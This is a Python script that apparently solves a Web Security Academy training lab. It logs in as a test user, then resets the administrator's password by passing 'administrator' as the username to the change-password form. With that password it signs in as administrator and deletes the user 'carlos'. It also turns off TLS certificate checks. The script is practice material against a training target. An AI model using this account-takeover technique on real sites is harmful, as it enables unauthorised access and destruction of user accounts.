#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

session = requests.Session()
url = 'https://0a85007603d8768180763f2700cb002a.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

# Get my account page

response = session.get(
    url + '/my-account',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


data = {
    'csrf': csrf,
    'username': 'administrator',
    'new-password-1':'peter',
    'new-password-2':'peter',
}

response = session.post(
    url + '/my-account/change-password',
    data=data,
    verify=False,
)


response = session.get(
    url + '/logout',
    verify=False,
)

# Get login
sess = requests.Session()
response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'administrator',
    'password': 'peter',
}

response = sess.post(
    url + '/login',
    data=data,
    verify=False,
    # allow_redirects=False
)


response = sess.get(
    url + '/admin/delete?username=carlos',
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
